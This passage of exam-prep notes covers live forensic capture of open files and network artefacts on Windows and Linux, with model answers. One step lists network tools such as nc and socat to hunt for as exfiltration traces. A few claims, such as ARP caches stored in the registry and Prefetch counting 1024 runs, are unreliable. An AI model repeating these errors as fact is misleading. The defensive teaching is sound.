    Step9[Step 9 - System Shutdown Decision - Power Off vs Hibernation]
    End([Forensic Image Acquisition - Dead System Analysis])

    Start --> Step1
    Step1 --> Step2
    Step2 --> Step3
    Step3 --> Step4
    Step4 --> Step5
    Step5 --> Step6
    Step6 --> Step7
    Step7 --> Step8
    Step8 --> Step9
    Step9 --> End
```

> [!NOTE]  
> **Why this order matters**: The order of volatile data capture is governed by the *Order of Volatility* (RFC 3227). Registers and CPU caches are most volatile, followed by RAM, then disk. Open file handles reside in RAM and must be captured **before** the system is shut down. Once powered off, the handle tables are destroyed, and only the on-disk remnants (MFT, $LogFile, $UsnJrnl) remain.

### 4.4 Block-Level Functional Architecture — Open File Forensic Pipeline

```mermaid
flowchart LR
    subgraph AcquisitionLayer[Volatile Acquisition Layer]
        A1[Live RAM Dump]
        A2[Process Snapshot]
        A3[Handle Table Dump]
        A4[FD Enumeration via proc]
    end

    subgraph ParsingLayer[Artifact Parsing Layer]
        P1[MFT Parser]
        P2[USN Journal Parser]
        P3[Registry Parser]
        P4[Inode Metadata Extractor]
    end

    subgraph CorrelationLayer[Correlation and Enrichment Layer]
        C1[Timestamp Alignment]
        C2[Handle-to-Path Resolution]
        C3[Cross-Process Socket Mapping]
        C4[Deleted File Reconstruction]
    end

    subgraph ReportingLayer[Analysis and Reporting Layer]
        R1[Timeline Generator]
        R2[Chain of Custody Log]
        R3[SHA256 Hash Database]
        R4[Court-Ready Evidence Report]
    end

    A1 --> P1
    A2 --> P3
    A3 --> P2
    A4 --> P4
    P1 --> C1
    P2 --> C2
    P3 --> C3
    P4 --> C4
    C1 --> R1
    C2 --> R1
    C3 --> R2
    C4 --> R4
    R1 --> R4
    R2 --> R4
    R3 --> R4
```

> [!IMPORTANT]  
> **Functional Insight**: The pipeline is deliberately linear within each layer but allows parallel execution *across* layers. The Correlation Layer is the **single point of truth fusion** where volatile handle data meets persistent filesystem metadata. Any inconsistency detected here (e.g., a handle pointing to a file with no MFT entry) indicates either **anti-forensic activity** (file deletion) or **rootkit file hiding** and must be escalated.

## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A Questions (3 Marks Each)

#### Question 1 — `[KTU University Exam - Dec 2023, Model Question Paper Set A]`

**Q: Define an "open file" in the context of digital forensics. Differentiate between a Windows file handle and a Linux file descriptor.**

**Model Answer (3 Marks — Allocation: 1 mark definition + 2 marks differentiation):**

An *open file* is a file on a storage medium that currently holds an active reference from a running process, represented in the operating system's kernel memory as a live in-memory object. It is volatile evidence, existing only while the process or system remains active. (1 Mark)

| Aspect | Windows File Handle | Linux File Descriptor |
|--------|---------------------|------------------------|
| Data Structure | `_HANDLE_TABLE` entry pointing to a `_FILE_OBJECT` | Integer index into a per-process `fd_table` array |
| Visibility | Opaque pointer value (e.g., `0x00000000000004C4`) | Sequential non-negative integer (e.g., `3`, `4`, `5`) |
| Granularity | Encodes object type, access mask, attributes | Separated into `fdinfo` (`flags`, `pos`) and `/proc/<pid>/fd` symlinks |
| Resource Identification | Resolved via object name (e.g., `\Device\HarddiskVolume2\...`) | Resolved via symlink target (e.g., `/home/user/file.txt`) |

(2 Marks)

#### Question 2 — `[KTU University Exam - June 2024, Supplementary Examination]`

**Q: What is a Section Object in Windows forensics? Why is it significant for recovering deleted executables?**

**Model Answer (3 Marks):**

A **Section Object** (`_SECTION_OBJECT`) is a Windows kernel construct that represents a *memory-mapped region* of a file. When Windows loads a PE executable (EXE) or a Dynamic Link Library (DLL) into a process's virtual address space, it uses the section object mechanism to map the file's on-disk contents directly into RAM, allowing demand-paging and shared access. (1.5 Marks)

**Forensic Significance**:
- A malicious actor can **delete the on-disk EXE file** after execution. The MFT entry may show the file as deleted, and the original bytes are partially overwritten in unallocated clusters. However, the **Section Object mapping** in RAM still holds a complete or near-complete copy of the executable.
- Memory forensic tools such as **Volatility's `filescan` and `dumpfiles` plugins** walk the kernel's `_FILE_OBJECT` pool, identify Section-backed objects, and extract the mapped content to disk for hashing and static analysis. This allows recovery of the original executable even when anti-forensic deletion was attempted. (1.5 Marks)

---

### 5.2 Part B Questions (14 Marks — Internal Choice)

> [!WARNING]  
> **KTU Examiner's Valuation Warning — Pitfall Callout**:  
> Students commonly lose 3-4 marks in 14-mark open file questions by:
> 1. **Confusing volatile vs non-volatile evidence** — Open file handles are *volatile*. Always specify the tool used and the order of acquisition.
> 2. **Skipping the MFT/inode cross-reference** — The examiner expects you to demonstrate that you *correlate* handle state with on-disk metadata, not just list handles.
> 3. **Ignoring Section Objects / memory-mapped files** — A complete answer must mention executable and DLL mapping for full marks.
> 4. **Omitting chain-of-custody considerations** — In a 14-mark question, at least one bullet should reference hash computation and evidence integrity.

---

#### **Question A (14 Marks)** — `[KTU University Exam - Dec 2023, Main Examination]`

**Q: A forensic investigator arrives at a Windows 10 machine suspected of hosting cryptocurrency mining malware. The machine is currently powered on. Answer the following:**

**(a)** Outline a step-by-step procedure to identify all open files held by suspicious processes, including memory-mapped DLLs and deleted executables. **(7 Marks)**

**(b)** Explain how you would correlate the discovered open file evidence with on-disk artifacts (MFT, $LogFile, $UsnJrnl) to reconstruct the timeline of the malware's installation and execution. **(7 Marks)**

---

**Model Solution (a) — 7 Marks:**

**Step 1 — Live State Documentation (0.5 Mark):**  
Record date, time, system hostname, logged-in users, and the SHA256 hashes of all forensic tools to be executed. This establishes chain of custody.

**Step 2 — Process Enumeration (0.5 Mark):**  
Run `tasklist /v /fo CSV > processes.csv` and `Get-Process | Select-Object Id,Name,Path,Company > ps_list.csv` via PowerShell. Identify suspicious processes by:
- Unsigned binaries located in `C:\Users\*\AppData\` or `C:\Temp\`.
- Unusual parent-child relationships (e.g., `cmd.exe` spawning `powershell.exe` with `-enc`).
- High sustained CPU usage consistent with mining.

**Step 3 — Handle Enumeration (1.5 Marks):**  
Execute `handle.exe -a -p <PID>` (Sysinternals) for each suspicious process. Filter output to retain only `File` type entries. Record:
- File path (resolved from `\Device\HarddiskVolume*` symbolic link to drive letter).
- Granted access mask (e.g., `0x00120089` = `FILE_READ_DATA | FILE_WRITE_DATA | FILE_EXECUTE | SYNCHRONIZE | READ_CONTROL`).

**Step 4 — Memory-Mapped File Recovery (2 Marks):**  
Acquire a full memory dump using `FTK Imager` or `WinPmem`. Load the dump into **Volatility** with profile `Win10x64`. Run:
- `volatility -f mem.raw filescan` → enumerates all `_FILE_OBJECT` structures.
- `volatility -f mem.raw dumpfiles -D ./extracted/` → extracts memory-mapped files.
- `volatility -f mem.raw malfind` → identifies injected code regions with RWX permissions.

**Step 5 — Deleted Executable Recovery (1.5 Marks):**  
For each memory-mapped executable extracted, cross-reference its path with the MFT. If the MFT shows the file as deleted but the memory mapping persists, the malware is "fileless" in the on-disk sense. The recovered memory copy is submitted as evidence. Hash the recovered file with SHA256 and document it.

**Step 6 — Network and Service Correlation (1 Mark):**  
Use `netstat -ano -b` and `TCPView` to identify network connections owned by the suspicious PIDs. Correlate with the open handles to determine if the miner is communicating with a mining pool (e.g., `pool.minexmr.com`).

---

**Model Solution (b) — 7 Marks:**

**Step 1 — MFT Acquisition (1 Mark):**  
Parse the `$MFT` file from the forensic image using `MFTECmd` or `analyzeMFT`. Extract the `$STANDARD_INFORMATION` (SI) and `$FILE_NAME` (FN) timestamps for the suspicious executable and its associated DLLs.

**Step 2 — $SI vs $FN Timestamp Comparison (2 Marks):**  
Compare SI timestamps with FN timestamps for the same file. Discrepancies (e.g., SI `$STANDARD_INFORMATION` creation time is 6 months before FN `$FILE_NAME` creation time) indicate **timestamp stomping** (anti-forensic manipulation using tools like `SetMACE` or `timestomp`).

**Step 3 — $LogFile Journal Analysis (1.5 Marks):**  
Parse the NTFS `$LogFile` using `NTFSLogFile` or `LogFileParser`. Locate redo records referencing the suspicious file's MFT entry sequence number. The earliest `Open` or `Create` record in the log provides a **non-modifiable** lower bound for the file's existence on the system.

**Step 4 — $UsnJrnl Analysis (1.5 Marks):**  
Parse the Change Journal (`$Extend\$UsnJrnl:$J`) using `MFTECmd -f $UsnJrnl`. The USN Journal records file creations, renames, data extensions, and deletions in chronological order. Locate the exact USN record where the mining executable was first created and identify any subsequent rename operations (a common anti-forensic technique).

**Step 5 — Timeline Reconstruction (1 Mark):**  
Use **Plaso / log2timeline** to integrate the following data sources into a unified super-timeline:
- Event Logs (Security, System, Application — specifically Event ID 4688 for process creation).
- Prefetch files (`C:\Windows\Prefetch\*.pf`) showing the executable's first and last execution times (up to 1024 executions).
- Shimcache / Amcache entries.
- Open file timestamps from Step 3 of part (a).

The resulting timeline reveals: the **drop time** of the initial loader (USN record) → the **execution time** (Prefetch, Event 4688) → the **persistence mechanism installation** (Registry Run keys, Scheduled Tasks) → the **active mining session** (live open handles).

---

#### **Question B (14 Marks — Alternative Choice)** — `[KTU University Exam - June 2024, Supplementary Examination]`

**Q: A Linux server (Ubuntu 22.04 LTS) is suspected of being used as a covert data exfiltration relay. The server is running and the investigator has read-only SSH access. Answer the following:**

**(a)** Describe the procedural steps to enumerate all open files (including memory-mapped libraries and active network sockets) for every running process on the system. Provide the exact command-line invocations. **(7 Marks)**

**(b)** Explain how the recovered `/proc` artifacts and `lsof` output are correlated with on-disk inode metadata, shell history, and authentication logs to prove the exfiltration activity. **(7 Marks)**

---

**Model Solution (a) — 7 Marks:**

**Step 1 — System State Documentation (0.5 Mark):**  
Run `uname -a`, `date -u`, `who`, and `uptime` to record the system fingerprint. Generate SHA256 hashes of all tools (`lsof`, `bash`, `stat`) via `sha256sum $(which lsof) > tool_hashes.txt`.

**Step 2 — Comprehensive Process Enumeration (0.5 Mark):**  
Run:
```
ps auxwwf > process_tree.txt
ls -la /proc | grep '^[d-].*[0-9]$' | awk '{print $9}' | sort -n > pid_list.txt
```

**Step 3 — Per-Process FD Enumeration (2 Marks):**  
For each PID in the list:
```
ls -la /proc/<PID>/fd/ > fd_<PID>.txt
cat /proc/<PID>/fdinfo/* > fdinfo_<PID>.txt
cat /proc/<PID>/maps > maps_<PID>.txt
cat /proc/<PID>/status > status_<PID>.txt
```
Record the **symlink targets** in `/proc/<PID>/fd/` to identify all open files. Pay special attention to:
- Files in `/tmp`, `/var/tmp`, `/dev/shm` (common malware staging areas).
- Deleted files showing as `/path/to/file (deleted)` — the process still has the file open despite deletion.
- Suspicious executables in `/usr/local/bin` or user home directories.

**Step 4 — Memory-Mapped Library Identification (1 Mark):**  
Filter `/proc/<PID>/maps` for entries with the `r-xp` permission flag (read + execute + private). These represent memory-mapped executables and shared libraries. A typical exfiltration tool's mapping would appear as:
```
7f8b2c000000-7f8b2c021000 r-xp 00000000 08:01 12345 /usr/local/bin/exfil_tool
```

**Step 5 — Network Socket Enumeration (1.5 Marks):**  
Run:
```
ss -tulpn > listening_sockets.txt
ss -p -t -x -u > active_connections.txt
lsof -i -P -n > network_lsof.txt
```
Correlate the **socket inode numbers** (e.g., `socket:[12345]`) with the entries in `/proc/<PID>/fd/` to map each connection back to its owning process. Note remote IP addresses and ports.

**Step 6 — Aggregate `lsof` Capture (1 Mark):**  
Run the canonical `lsof` capture for archival:
```
lsof -nP -F > lsof_full.txt
```
The `-F` flag produces parseable output suitable for ingestion into automated analysis pipelines.

**Step 7 — Preservation (0.5 Mark):**  
Tarball all artifacts, compute SHA256 hash of the archive, and transfer via read-only SCP to the investigator's workstation.

---

**Model Solution (b) — 7 Marks:**

**Step 1 — Inode Metadata Correlation (1.5 Marks):**  
For each unique file path recovered from `/proc/<PID>/fd/`, run:
```
stat <file_path>
debugfs -R 'stat <inode_number>' /dev/sda2
```
Compare the `atime` (access time) with the `mtime` (modification time) and `ctime` (change time). A recent `atime` matching the suspected exfiltration window confirms the file was actively read. The **inode number** uniquely identifies the on-disk object even if the file is later renamed.

**Step 2 — Deleted-But-Open File Recovery (1.5 Marks):**  
If a file appears as `(deleted)` in `/proc/<PID>/fd/`, the process still holds the inode open. The file's content can be recovered by reading from the FD:
```
cat /proc/<PID>/fd/<FD_number> > recovered_deleted_file.bin
```
This recovers the live in-memory content of the deleted file — a frequent occurrence in malware that stages payloads in `/tmp`, executes them, and deletes the disk copy while remaining active.

**Step 3 — Shell History Analysis (1 Mark):**  
Retrieve and parse:
```
cat /home/<user>/.bash_history
cat /root/.bash_history
cat /home/<user>/.zsh_history
```
Search for `wget`, `curl`, `scp`, `nc`, `socat`, `rsync`, or `ssh` invocations targeting external hosts. Cross-reference command timestamps with the socket open times from Step 5 of part (a).

**Step 4 — Authentication Log Correlation (1.5 Marks):**  
Parse `/var/log/auth.log` (or `/var/log/secure` on RHEL) using `grep`, `awk`, or `auditd` reports. Identify:
- Successful SSH logins from unusual IP addresses (Event: `Accepted publickey for <user> from <IP>`).
- Sudo privilege escalations (`sudo` commands run by non-admin users).
- SFTP/SCP session durations correlating with active socket lifetimes.

**Step 5 — Network Log Fusion (1 Mark):**  
Cross-reference the remote IPs and ports from `lsof -i` and `ss` output with:
- `/var/log/ufw.log` or `iptables` logs.
- `/var/log/nginx/access.log` or Apache access logs.
- Suricata / Zeek (formerly Bro) IDS logs if deployed.

The fusion of **process-level open file evidence** (volatile) with **authentication history** (semi-volatile) and **network flow records** (semi-volatile) provides three independent corroboration vectors, satisfying the **Daubert Standard** for admissibility of digital evidence.

**Step 6 — Final Reporting (0.5 Mark):**  
Generate a unified report documenting: the exact PID, the open file paths, the inodes, the deleted-but-recovered content (with SHA256 hash), the shell command sequence, and the corresponding authentication timestamps. The report is signed, hashed, and entered into the case management system.

---

### 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]  
> **Rapid Revision Checklist — KTU Module 2: Open Files**

- **Definition**: An *open file* is a volatile in-memory reference (Windows handle or Linux file descriptor) from a running process to a file resource.
- **Windows Handle Table**: Each process has one `_HANDLE_TABLE`; each entry points to a `_FILE_OBJECT`, which connects to a `_DEVICE_OBJECT` and ultimately a Volume Parameter Block.
- **Linux `/proc/<pid>/fd/`**: Symbolic links reveal the absolute path of every open file descriptor. The companion `/proc/<pid>/fdinfo/` provides `pos` (file position) and `flags` (access mode).
- **Section Objects (Windows)**: Memory-mapped files used to load EXEs and DLLs; critical for recovering deleted-but-still-running executables.
- **`/proc/<pid>/maps` (Linux)**: Lists memory-mapped regions; entries with `r-xp` indicate executable mappings.
- **`lsof` vs `handle.exe`**: `lsof` is the de-facto Linux tool; `handle.exe` (Sysinternals) is the Windows equivalent. Both produce point-in-time snapshots.
- **Order of Volatility**: Handle tables and FD tables reside in RAM — they must be captured **before** system shutdown, which destroys them.
- **Anti-Forensic Counter**: Deleting a file from disk does **not** remove the open file handle. Memory dumps and `/proc/<pid>/fd/` enumeration can recover the deleted content.
- **MFT / Inode Cross-Reference**: Always correlate open file paths with on-disk metadata. Discrepancies (e.g., timestamp stomping, deleted entries) indicate tampering.
- **Tools Checklist (Exam Favorite)**:  
  - Windows: `handle.exe`, Process Hacker, Volatility (`filescan`, `dumpfiles`, `malfind`), FTK Imager, MFTECmd, Plaso.  
  - Linux: `lsof`, `ps`, `ls /proc/<pid>/fd`, `cat /proc/<pid>/maps`, `ss`, `netstat`, `stat`, `debugfs`, Plaso.
- **Chain of Custody**: Hash every artifact with SHA256. Record tool versions and timestamps. Maintain read-only access to evidence sources.
- **Network Sockets are Open Files**: Sockets appear in both Windows handle tables and Linux `/proc/<pid>/fd/` as `socket:[inode]` entries. They are essential for correlating process activity with network exfiltration.
- **Symbolic Link Resolution**: Windows `\Device\HarddiskVolume2\Users\Alice\file.txt` must be resolved to `C:\Users\Alice\file.txt` using the process's `DosDevices` directory.
- **USN Journal & $LogFile**: NTFS-specific; record file system operations immutably and help prove file existence even when deleted.
- **No `atime` Guarantee**: Modern Linux uses `relatime` / `noatime` mount options; verify `/proc/mounts` before relying on access time evidence.
- **KTU Keyword Triggers**: When you see "live forensics", "volatile evidence", "handle", "file descriptor", "memory-mapped", or "deleted executable recovery" — the answer is rooted in this topic.
</br>

<!-- SECTION_5_END -->

topics.title: Network Information
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PECCT866 - WINDOWS AND LINUX FORENSICS > - **Module:** Module 2 > - **Topic:** Network Information # 1. Core Technical Definition & Intuitive Overview ## 1.1 Formal Academic Definition **Network Information** in the context of digital forensics refers to the comprehensive set of artifacts, metadata, configuration data, and connection states that describe how a computing device (Windows or Linux) has interacted with, participated in, or been exposed to a computer network. This encompasses IP addressing data (IPv4 and IPv6), MAC addresses, routing tables, ARP caches, DNS resolver caches, active/binding socket connections, network interface configurations, wireless association histories, firewall logs, VPN tunnelling state, and persistent network artifacts (e.g., DHCP leases, Wi-Fi profiles, browser network fingerprints). From a forensic perspective, Network Information is treated as **volatile, semi-volatile, and non-volatile evidence**: - **Volatile** (lost on reboot): active TCP/UDP sockets, ARP cache, kernel routing table, connection states. - **Semi-volatile** (persists in logs): DNS cache, DHCP leases, firewall logs, event logs. - **Non-volatile** (persists long-term): registry-stored network profiles (Windows), `/etc/network/interfaces` (Linux), Wi-Fi SSID/password records, `/var/log` artifacts. > [!IMPORTANT] > **KTU 2024 Syllabus Highlight:** Module 2 of *Windows and Linux Forensics* emphasizes that the network footprint of a compromised or suspect machine is a *goldmine* of evidentiary artefacts. The forensic investigator must capture network state **in a prescribed order of volatility** (RFC 3227 — *Guidelines for Evidence Collection and Archiving*) before powering down the system. ## 1.2 Conceptual Analogy — Plain English Intuition Imagine a person (your computer) living in a large apartment complex (the internet). **Network Information** is essentially everything written on the building's notice board, the intercom log, the visitor register, and the mailroom records about that person: - The **apartment number (IP address)** and the **biometric badge (MAC address)** identify them. - The **visitors' register (ARP cache)** tells you who came knocking recently. - The **mail-forwarding slips (routing table)** show where their outgoing post is being redirected. - The **intercom call log (DNS cache)** records whom they tried to call most recently. - The **CCTV footage (firewall/NAT logs)** preserves who came in and went out. For a forensic investigator, these "notice-board" entries together reconstruct the **digital journey** of a suspect machine — when it joined a network, what it talked to, and what was talking back. ## 1.3 Key Network Identifiers & Standard Metrics | Identifier | Definition | Format | Standard | |---|---|---|---| | **IP Address (v4)** | Logical address on a network | 32-bit dotted decimal | **RFC 791** | | **IP Address (v6)** | Next-generation logical address | 128-bit hexadecimal | **RFC 8200** | | **MAC Address** | Physical/hardware address | 48-bit hex (`AA:BB:CC:DD:EE:FF`) | **IEEE 802** | | **Port Number** | Logical endpoint (0–65535) | 16-bit unsigned int | **IANA** | | **Default Gateway** | Router IP for off-subnet traffic | IPv4/IPv6 address | — | | **Subnet Mask** | Defines network/host boundary | 32-bit dotted | **CIDR /24, /16, etc.** | | **DNS Server** | Name resolution authority | IPv4/IPv6 address | **RFC 1035** | | **DHCP Lease Time** | Validity of dynamic IP allocation | Seconds | **RFC 2131** | > [!NOTE] > **Why this matters in KTU exams:** Examiner's almost always test the student's ability to *correlate* these identifiers — for example, joining an ARP entry to a suspicious IP, or mapping a DNS query to a known malicious domain. ## 1.4 Order of Volatility (RFC 3227) — KTU Hot Topic The forensic collection of network information must follow a strict **Order of Volatility** to avoid destroying evidence: 1. CPU registers, cache (most volatile — sub-second) 2. Routing table, ARP cache, kernel statistics 3. Process memory (RAM) 4. Temporary file systems (/tmp, temp folders) 5. Disk file system 6. Remote logging data 7. Physical configuration / network topology (least volatile) > [!IMPORTANT] > **KTU Board Tip:** Examiners frequently ask: *"Why must ARP cache and routing tables be collected before powering down the system?"* The expected answer: because they exist in volatile RAM memory and are **lost the instant the machine powers off**. --- # 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet ## 2.1 Layered Architecture of Network Information Forensics Network information, when examined forensically, can be classified across the **OSI / TCP-IP reference model** as follows: | Layer | Forensically Relevant Artefact | Windows Tool | Linux Tool | |---|---|---|---| | **Layer 2 (Data Link)** | MAC address, ARP cache | `arp -a`, `getmac` | `arp -an`, `ip neigh` | | **Layer 3 (Network)** | IP config, routing table | `ipconfig /all`, `route print` | `ifconfig`, `ip addr`, `ip route` | | **Layer 4 (Transport)** | Open ports, active sockets | `netstat -anob` | `netstat -tulnp`, `ss -tulnp` | | **Layer 7 (Application)** | DNS cache, HTTP sessions, browser history | `ipconfig /displaydns` | `systemd-resolve --statistics`, `/var/log` | | **Wireless (802.11)** | SSID, BSSID, signal, auth type | `netsh wlan show profiles` | `iwconfig`, `iwlist scan` | | **Firewall / IDS** | Allowed/blocked connections | Windows Defender Firewall logs | `iptables -L -n -v`, `ufw status` | ## 2.2 Theoretical Foundations — The "Why" Behind Each Artefact ### 2.2.1 ARP (Address Resolution Protocol) Cache - **Why it exists:** Maps a known Layer-3 IP address to a Layer-2 MAC address on the local broadcast domain. - **Forensic value:** Reveals which *other* hosts the suspect machine has recently communicated with on the LAN — possibly a co-conspirator's device or a C2 (Command-and-Control) node. - **Lifetime:** Typically 15–45 seconds for incomplete entries; up to 20 minutes for resolved entries (OS-dependent). - **Persistence on disk:** Windows 7+ stores ARP entries in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\ArpCache`. ### 2.2.2 Routing Table - **Why it exists:** Tells the kernel where to forward IP packets that are not destined for the local subnet. - **Forensic value:** Reveals rogue or unauthorised routes — a common indicator of compromise (e.g., an attacker adding a default route through their controlled gateway for traffic redirection). - **Persistence on disk:** Linux — `/proc/net/route` and `/etc/iproute2/rt_tables`; Windows — `route print` output cached in `netbt.sys` driver state. ### 2.2.3 DNS Cache - **Why it exists:** Stores recently resolved domain names to avoid repeated lookups. - **Forensic value:** Critical for identifying **malware beaconing** to malicious domains (e.g., `evil-c2.xyz`, `cryptominer.pool.com`). - **Persistence on disk:** Windows — `ipconfig /displaydns` shows in-memory; Windows DNS Client service stores cache in `dnsrslvr.log` style structures; Linux — `nscd` cache, `systemd-resolved` `cache` files, and the `dnsmasq` log. ### 2.2.4 Active Sockets / Listening Ports - **Why it exists:** Shows currently open communication endpoints. - **Forensic value:** Detects backdoors, RATs (Remote Access Trojans), reverse shells bound to high ports. - **Persistence on disk:** Sockets are *purely volatile*, but a record persists in `/proc//net/tcp` (Linux) and in memory-mapped structures (`TcbTable` in `tcpip.sys` for Windows). ### 2.2.5 DHCP Lease Information - **Why it exists:** Dynamically assigned IP configurations. - **Forensic value:** Confirms the network the device was on, the duration of presence, the DHCP server identity, and historical movement across networks. - **Windows persistence:** `C:\Windows\System32\dhcp\` event logs; registry: `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\DhcpIPAddress`. - **Linux persistence:** `/var/lib/dhclient/dhclient.leases`, `/var/lib/NetworkManager/*.lease`. ### 2.2.6 Wireless Network Profiles - **Why it exists:** Persistent records of Wi-Fi networks the device has joined. - **Forensic value:** Reveals the suspect's location history (SSID = "Starbucks_WiFi" vs. "Home_Network"), and potentially recovers plaintext passwords from registry (Windows). - **Windows path:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\` and `C:\ProgramData\Microsoft\Wlansvc\Profiles\`. - **Linux path:** `/etc/NetworkManager/system-connections/*.nmconnection`. ## 2.3 KTU Formula Sheet / Cheat Sheet | Concept | Formula / Representation | Unit / Range | Boundary Condition | |---|---|---|---| | IPv4 to Binary | $\text{Octet} = \sum_{i=0}^{7} b_i \cdot 2^{7-i}$ | 0 to 255 per octet | 32-bit address space | | CIDR subnet count | $N_{subnets} = 2^{s}$ where $s$ = borrowed bits | Integer | $0 \le s \le 30$ for IPv4 | | Hosts per subnet | $H = 2^{h} - 2$ where $h$ = host bits | Integer | $H \ge 2$ for usable subnets | | IPv4 total addresses | $2^{32}$ | 4,294,967,296 | All possible IPv4 | | IPv6 total addresses | $2^{128}$ | $3.4 \times 10^{38}$ | Practically inexhaustible | | Port range | $0$ to $2^{16}-1$ | 0 to **65535** | 0–1023 = well-known, 1024–49151 = registered, 49152–65535 = ephemeral | | MAC OUI identification | First 24 bits = OUI, assigned by IEEE | Hex | OUI → Vendor mapping | | DHCP lease duration | $T_{lease} \in [60\text{s}, \infty)$ | Seconds | Default: 24 hours | | IPv6 prefix length | $/64$ typical for LAN | Bits | $/128$ = single host | | Network bandwidth | $BW = \text{Packets/sec} \times \text{Bytes/packet}$ | Bytes/sec or bits/sec | $BW \le \text{Link capacity}$ | > [!IMPORTANT] > **KTU Note on Pipes:** Per the system protocol, the symbol $\mid$ is rendered using the LaTeX `\vert` command. For example, absolute value of $x$ is written as $\vert x \vert$ to avoid breaking the markdown table. ## 2.4 Real-World Engineering Utility Network Information forensics is foundational in: - **Incident Response (IR):** Rapid triage of compromised endpoints (identify C2 channels, lateral movement). - **Cybercrime Investigation:** Proving the suspect machine was at a specific IP at a specific time. - **Insider Threat Detection:** Identifying unauthorised VPN connections or TOR usage. - **e-Discovery / Litigation:** Establishing the chain of custody for digital evidence used in court. - **Penetration Test Reporting:** Post-engagement cleanup validation and report generation. --- # 3. Step-by-Step Derivations & Analytical Matrix ## 3.1 Exhaustive Step-by-Step: Subnet Calculation from a Forensic IP A common KTU question pattern: *"Given an IP address and a subnet mask, determine the network address, broadcast address, and number of usable hosts."* ### Worked Example Given: IP = `192.168.10.45/26` **Step 1 — Convert the IP to 32-bit binary** $$ \begin{aligned} 192 &= 1100\,0000 \\ 168 &= 1010\,1000 \\ 10 &= 0000\,1010 \\ 45 &= 0010\,1101 \\ \text{IP (binary)} &= 1100\,0000.\,1010\,1000.\,0000\,1010.\,0010\,1101 \end{aligned} $$ **Step 2 — Derive the subnet mask from /26 (26 prefix bits)** $$ \begin{aligned} /26 &\Rightarrow 26 \text{ network bits}, \; 32-26 = 6 \text{ host bits} \\ \text{Mask} &= 1111\,1111.\,1111\,1111.\,1111\,1111.\,1100\,0000 \\ \text{Mask (dotted)} &= 255.255.255.192 \end{aligned} $$ **Step 3 — Compute the network address (Bitwise AND of IP and Mask)** $$ \begin{aligned} \text{Network} &= \text{IP} \;\text{AND}\; \text{Mask} \\ &= 1100\,0000.\,1010\,1000.\,0000\,1010.\,0010\,1101 \\ &\;\;\text{AND}\; \\ &\;\;\;1111\,1111.\,1111\,1111.\,1111\,1111.\,1100\,0000 \\ &= 1100\,0000.\,1010\,1000.\,0000\,1010.\,0000\,0000 \\ \text{Network (dotted)} &= 192.168.10.0 \end{aligned} $$ **Step 4 — Compute the broadcast address (set all host bits to 1)** $$ \begin{aligned} \text{Broadcast} &= 1100\,0000.\,1010\,1000.\,0000\,1010.\,0011\,1111 \\ &= 192.168.10.63 \end{aligned} $$ **Step 5 — Compute usable host count** $$ \begin{aligned} H &= 2^{h} - 2 \\ H &= 2^{6} - 2 \\ H &= 64 - 2 \\ H &= 62 \text{ usable hosts} \end{aligned} $$ **Step 6 — Identify the first and last usable host** $$ \begin{aligned} \text{First usable} &= \text{Network} + 1 = 192.168.10.1 \\ \text{Last usable} &= \text{Broadcast} - 1 = 192.168.10.62 \end{aligned} $$ > [!NOTE] > **KTU Pitfall:** Many students forget to subtract 2 (one for network address, one for broadcast). KTU examiners routinely deduct 1 mark for this omission. ## 3.2 Exhaustive Step-by-Step: Forensic Reconstruction of a Connection A classic investigation question: *"A suspect PC had an outbound connection to IP 203.0.113.45 on port 443 at 14:32:00 UTC. Reconstruct the network forensic artefacts you would expect to find, and in what order."* ### Analytical Walk-through **Step 1 — Identify the Layer-2 (MAC) context** The ARP cache at the timestamp should contain: $$ \text{ARP: } 203.0.113.45 \;\longmapsto\; \text{AA:BB:CC:11:22:33} $$ This is the MAC of the next-hop (the default gateway's ARP-resolved MAC for the destination). **Step 2 — Identify the Layer-3 (IP routing) context** The routing table at that moment would show: $$ 0.0.0.0/0 \;\longrightarrow\; 192.168.1.1 \;\text{(default gateway, metric 25)} $$ The kernel decided 203.0.113.45 was off-subnet → forwarded to gateway 192.168.1.1. **Step 3 — Identify the Layer-4 (socket) context** The active socket table would show: $$ \begin{aligned} \text{Proto} &= \text{TCP} \\ \text{Local} &= 192.168.1.50:49512 \quad (\text{ephemeral source port}) \\ \text{Remote} &= 203.0.113.45:443 \quad (\text{HTTPS}) \\ \text{State} &= \text{ESTABLISHED} \\ \text{PID/Process} &= 4820 \;(\text{e.g., chrome.exe}) \end{aligned} $$ **Step 4 — Identify the Layer-7 (DNS) context** The DNS cache would hold (assuming the hostname was `evil.example.com`): $$ \begin{aligned} \text{Record Name} &: \text{evil.example.com} \\ \text{Record Type} &: A \\ \text{TTL} &: 287 \\ \text{Data} &: 203.0.113.45 \end{aligned} $$ **Step 5 — Cross-correlation matrix (Analytical Output)** | Layer | Artefact | Forensic Value | Tool to Extract | |---|---|---|---| | L2 | ARP entry for 203.0.113.45 | Confirms LAN-side gateway | `arp -a` / `ip neigh` | | L3 | Default route via 192.168.1.1 | Identifies path | `route print` / `ip route` | | L4 | ESTABLISHED socket on :443 | Confirms active TLS session | `netstat -anob` / `ss` | | L7 | DNS A-record for evil.example.com | Identifies intent / C2 | `ipconfig /displaydns` | ## 3.3 Analytical Matrix: Windows vs. Linux Forensic Network Artefacts | Artefact Category | Windows Location | Linux Location | Forensic Tool (Windows) | Forensic Tool (Linux) | |---|---|---|---|---| | IP Configuration | `ipconfig /all` output, registry | `/etc/network/interfaces`, `ip addr` | Built-in CLI | `ip`, `ifconfig` | | ARP Cache | `arp -a`, `netsh interface ip show neighbors` | `ip neigh`, `arp -an` | `arp`, `netsh` | `ip`, `arp` | | Routing Table | `route print`, `netsh routing` | `ip route`, `route -n` | `route`, `netsh` | `ip`, `route` | | DNS Cache | `ipconfig /displaydns` | `systemd-resolve --statistics`, `nscd -g` | `ipconfig` | `systemd-resolve`, `nscd` | | Active Sockets | `netstat -anob` | `ss -tulnp`, `netstat -tulnp` | `netstat`, `TCPView` | `ss`, `netstat` | | Open Files/Net | Resource Monitor | `lsof -i` | `handle.exe`, RAM map | `lsof` | | DHCP Leases | Registry `DhcpIPAddress` | 